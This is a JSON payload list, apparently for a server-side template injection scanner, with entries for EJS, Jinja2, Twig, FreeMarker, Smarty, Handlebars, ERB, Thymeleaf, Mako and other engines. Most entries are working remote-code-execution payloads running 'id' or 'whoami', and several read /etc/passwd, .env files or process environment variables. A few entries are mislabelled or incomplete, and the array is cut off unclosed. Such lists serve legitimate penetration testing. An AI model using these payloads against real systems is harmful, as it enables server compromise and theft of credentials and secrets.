[
  {"name": "EJS 基本注入", "payload": "<%= 7*7 %>", "category": "ejs_basic"},
  {"name": "EJS 基本注入 2", "payload": "${7*7}", "category": "ejs_basic"},
  {"name": "EJS 基本注入 3", "payload": "#{7*7}", "category": "ejs_basic"},
  {"name": "EJS 全局对象", "payload": "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>", "category": "ejs_rce"},
  {"name": "EJS global process", "payload": "<%= global.process.mainModule.require('child_process').execSync('whoami') %>", "category": "ejs_rce"},
  {"name": "EJS process 直接", "payload": "<%= process.mainModule.require('child_process').execSync('id') %>", "category": "ejs_rce"},
  {"name": "EJS require", "payload": "<%= require('child_process').execSync('id') %>", "category": "ejs_rce"},
  {"name": "EJS constructor RCE", "payload": "<%= this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') %>", "category": "ejs_rce"},
  {"name": "EJS 构造函数链", "payload": "<%= global.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id') %>", "category": "ejs_rce"},
  {"name": "EJS 反射 RCE", "payload": "<%= Reflect.construct(Object, []) %>", "category": "ejs_rce"},
  {"name": "EJS Buffer RCE", "payload": "<%= Buffer.from('id').toString() %>", "category": "ejs_rce"},
  {"name": "EJS fs 读取", "payload": "<%= require('fs').readFileSync('/etc/passwd', 'utf-8') %>", "category": "ejs_file_read"},
  {"name": "EJS fs 读取 2", "payload": "<%= require('fs').readdirSync('/etc') %>", "category": "ejs_file_read"},
  {"name": "EJS fs 读取 .env", "payload": "<%= require('fs').readFileSync('.env', 'utf-8') %>", "category": "ejs_file_read"},
  {"name": "EJS 环境变量", "payload": "<%= Object.keys(process.env) %>", "category": "ejs_info"},
  {"name": "EJS 环境变量详情", "payload": "<%= process.env %>", "category": "ejs_info"},
  {"name": "EJS console.log", "payload": "<%= console.log('SSTI DETECTED') %>", "category": "ejs_info"},

  {"name": "Jinja2 基本", "payload": "{{7*7}}", "category": "jinja2"},
  {"name": "Jinja2 RCE", "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", "category": "jinja2"},
  {"name": "Jinja2 config", "payload": "{{ config }}", "category": "jinja2"},
  {"name": "Jinja2 简写", "payload": "{{ config.__class__.__init__.__globals__['os'].popen('id') }}", "category": "jinja2"},
  {"name": "Jinja2 lipsum", "payload": "{{ lipsum.__globals__['os'].popen('id').read() }}", "category": "jinja2"},
  {"name": "Jinja2 cycler", "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "category": "jinja2"},
  {"name": "Jinja2 joiner", "payload": "{{ joiner.__init__.__globals__.os.popen('id').read() }}", "category": "jinja2"},
  {"name": "Jinja2 mro", "payload": "{{ ''.__class__.__mro__[1].__subclasses__() }}", "category": "jinja2"},
  {"name": "Jinja2 request", "payload": "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}", "category": "jinja2"},
  {"name": "Jinja2 filter bypass", "payload": "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}", "category": "jinja2"},

  {"name": "Twig PHP 基本", "payload": "{{7*7}}", "category": "twig"},
  {"name": "Twig PHP RCE", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "category": "twig"},
  {"name": "Twig PHP 文件读", "payload": "{{'/etc/passwd'|file_excerpt(1,30)}}", "category": "twig"},
  {"name": "Twig PHP 源码", "payload": "{{source('/etc/passwd')}}", "category": "twig"},
  {"name": "Twig PHP include", "payload": "{{include('/etc/passwd')}}", "category": "twig"},

  {"name": "FreeMarker 基本", "payload": "${7*7}", "category": "freemarker"},
  {"name": "FreeMarker RCE", "payload": "${'freemarker.template.utility.Execute'?new()('id')}", "category": "freemarker"},
  {"name": "FreeMarker ObjectConstructor", "payload": "${'freemarker.template.utility.ObjectConstructor'?new()('java.lang.ProcessBuilder','id')}", "category": "freemarker"},
  {"name": "FreeMarker 信息", "payload": "${.data_model}", "category": "freemarker"},

  {"name": "Velocity 基本", "payload": "#set($x=7*7)$x", "category": "velocity"},
  {"name": "Velocity RCE", "payload": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))", "category": "velocity"},

  {"name": "Smarty PHP", "payload": "{php}echo `id`;{/php}", "category": "smarty"},
  {"name": "Smarty PHP 2", "payload": "{system('id')}", "category": "smarty"},
  {"name": "Smarty PHP 3", "payload": "{$smarty.template_object->smarty->enableSecurity()}", "category": "smarty"},

  {"name": "Pug/Jade Node", "payload": "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('id')}()}", "category": "pug"},
  {"name": "Pug/Jade Node 2", "payload": "=global.process.mainModule.require('child_process').execSync('id')", "category": "pug"},
  {"name": "Hogan/Mustache", "payload": "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}", "category": "mustache"},
  {"name": "Nunjucks 基本", "payload": "{{7*7}}", "category": "nunjucks"},
  {"name": "Nunjucks RCE", "payload": "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}", "category": "nunjucks"},
  {"name": "Handlebars", "payload": "{{#with 's' as |string|}}{{#with 'e'}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub 'constructor')}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push 'return require(\"child_process\").execSync(\"id\");'}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}", "category": "handlebars"},

  {"name": "ERB Ruby", "payload": "<%= system('id') %>", "category": "ruby"},
  {"name": "ERB Ruby 2", "payload": "<%= `id` %>", "category": "ruby"},
  {"name": "Slim Ruby", "payload": "#{system('id')}", "category": "ruby"},
  {"name": "Thymeleaf", "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "category": "java"},
  {"name": "Mako Python", "payload": "${__import__('os').system('id')}", "category": "python"},
  {"name": "Tornado Python", "payload": "{{__import__('os').system('id')}}", "category": "python"},
